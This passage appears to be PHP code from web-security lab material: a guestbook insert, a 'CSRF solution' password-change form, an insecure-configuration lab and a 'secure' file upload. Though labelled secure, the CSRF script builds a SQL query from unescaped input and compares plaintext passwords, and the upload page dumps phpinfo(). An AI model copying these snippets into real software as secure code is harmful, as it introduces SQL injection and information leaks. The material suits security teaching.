   $message = htmlspecialchars(stripslashes(trim($_POST['mtxMessage'])));
   $name    = htmlspecialchars(stripslashes(trim($_POST['txtName'])));
   $result  = 0;
   try {
      $pdo = zendDatabaseConnect($config);
      $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
      $stmt = $pdo->prepare("INSERT INTO guestbook (name, comment) VALUES (?,?)");
      if (!$stmt->execute([$name, $message])) {
          error_log(__FILE__.':ERROR inserting to guestbook');
      } else {
          $result++;
      }
      //$result = $stmt->fetch(PDO::FETCH_ASSOC);
   } catch (PDOException $e) {
       error_log(__FILE__.':'.$e->getMessage());
        exit('Oops! Sorry.');
   }

   if($result > 0){
      echo 'Successful insert';
   } else{
      echo 'No results found';
   }
}
```

```
// CSRF solution
<?php
/**
 * A Secure Version Script
 *
 * Note: This is a limited secure version, not a complete one.
 * Please add access control (ACL) for query authorization.
 */

//Code to authenticate and authorize access...

if (isset($_POST['Change'])) {

    // Sanitise current password input
    $pass_curr = $_POST['password_current'] ?? 1;
    $pass_new = $_POST['password_new'] ?? 2;
    $pass_conf = $_POST['password_conf'] ?? 3;
    $token = $_POST['token'] ?? 4;

    $user = 'admin'; //Simulating a user here

    if( $token === $_SESSION['token']){
        if ($pass_new === $pass_conf) {

            //Check for correct current password
            try {
                $pdo = zendDatabaseConnect($config);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $stmt = $pdo->query("SELECT user_id, password FROM users WHERE user = '$user' AND password = '$pass_curr';");
                $result = $stmt->execute();
            } catch (PDOException $e) {
                exit('<pre>' . $e->getMessage() . '</pre>');
            }

            if($result){

                //Set password hashing options
                $options = [
                    'cost' => 12,
                ];

                //Build the hash
                $passhash = password_hash($pass_new, PASSWORD_BCRYPT, $options);

                //Update the password
                try {
                    $pdo = zendDatabaseConnect($config);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                    $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE user = ?;");
                    $stmt->execute([$passhash, $user]);
                } catch (PDOException $e) {
                    $html .= "<pre> Password update process not available </pre>";
                }

            } else {
                $html .= "<pre> Password Incorrect </pre>";
            }
        } else {
            $html .= "<pre> Passwords did not match. </pre>";
        }
    } else {
        $html.= "<pre> Invalid </pre>";
    }

} else {
    //Create and set a token
    //$token = md5(time());
    // alternatively use openssl_pseudo_random_bytes()
    $token = password_hash(base64_encode(random_bytes(32)), PASSWORD_BCRYPT);
    $_SESSION['token'] = $token;

    $formHtml = "
        <form action=\"#\" method=\"post\">
            <label>Current password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_current\">
            <label>New password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\">
            <label>Confirm new password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\">
            <input type=\"hidden\" name=\"token\" value=\"$token\">
            <br /><br /><input type=\"submit\" value=\"Change\" name=\"Change\">
        </form>";
}
```

```
// insecure configuration lab
<?php

$config = include __DIR__ . '/protected/dir/sensitive.config.php';

Class User
{
    protected $someData;
    protected $username;
    protected $password;

    /**
     * @param null $name
     * @param null $pass
     */
    public function __construct(array $config, $name = null, $pass = null)
    {
        $this->username = $name;
        $this->password = $pass;
        $this->someData = $config['someData'] ?? NULL;
    }
}

$user = new User($config);
$html = '';

if (!empty($_POST['username']) && !empty($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Encrypt the password ready for storage
    $username = ctype_alnum($_POST['username']);
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);

    //Code to check the database for existing username, we'll assume none here
    $user = new User($username, $password);

    //Call model and store user...

    $html .= "
        <div class=\"vulnerable_code_area\">
            <div>
                <h1>Thank You for signing up for our cool service!</h1>
                <p>We are here to help in case you need it.</p>
          </div>
         </div>";
}
```

```
// secure file upload
<?php
// TODO: redefine / override the php.ini setting for tmp files
// Initialize Variables
$message = '';
$fn      = '';

// make sure this is some known valid safe destination
$dir     = __DIR__ . DIRECTORY_SEPARATOR . "uploads" . DIRECTORY_SEPARATOR;

// Check to see if OK button was pressed
if ( isset($_POST['OK'])) {

    // Check to see if upload parameter specified
    if ( $_FILES['upload']['error'] == UPLOAD_ERR_OK ) {

        // Check to make sure file uploaded by upload process
        if ( is_uploaded_file ($_FILES['upload']['tmp_name'] ) ) {

            // TODO: validate the filename: i.e. jpg, png, gif, etc.

            // Strip directory info from filename
            $fn = basename($_FILES['upload']['name']);

            // Sanitize the filename
            // Note "i" (case insensitive) and "u" UTF-8 modifiers
            $fn = preg_replace('/[^a-z0-9-_.]/iu', '_', $fn);

            // Move image to ../backup directory
            $copyfile = $dir . $fn;

            // Copy file
            if ( move_uploaded_file ($_FILES['upload']['tmp_name'], $copyfile) ) {
                $message .= "<br>Successfully uploaded file " . htmlspecialchars($fn) . "\n";
            } else {
                // Trap upload file handle errors
                $message .= "<br>Unable to upload file " . htmlspecialchars($fn);
            }

        } else {
            // Failed security check
            $message .= "<br>File Not Uploaded!";
        }

    } else {
        // No photo file; return blanks and zeros
        $message .= "<br>No Upload File Specified\n";
    }
}

// AFTER UPLOAD: run anti-virus, etc. as cron job
// TODO: add some sort of flag which triggers the cron job

// Scan directory
$list = glob($dir . "*");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Upload File</title>
<style>
TD {
    font: 10pt helvetica, sans-serif;
    border: thin solid black;
    }
TH {
    font: bold 10pt helvetica, sans-serif;
    border: thin solid black;
    }
</style>
</head>
<body>
<h1>Upload File</h1>
<form name="Upload" method=POST enctype="multipart/form-data">
<input type=file method=POST enctype="multipart/form-data" size=50 maxlength=255 name="upload" value="" />
<br><input type=submit name="OK" value="OK" />
</form>
<p>Message: <?php echo $message; ?></p>
<p>Filename: <?php echo $fn; ?></p>
<table cellspacing=4>
<tr><th>Filename</th><th>Last Modified</th><th>Size</th></tr>
<?php
if (isset($list)) {
    foreach ($list as $item) {
        echo "<tr><td>$item</td>";
        echo "<td>" . date ("F d Y H:i:s", filemtime($item)) . "</td>";
        echo "<td align=right>" . filesize($item) . "</td>";
        echo "</tr>\n";
    }
}
echo "</table>\n";
phpinfo(INFO_VARIABLES);
?>
</body>
</html>
```
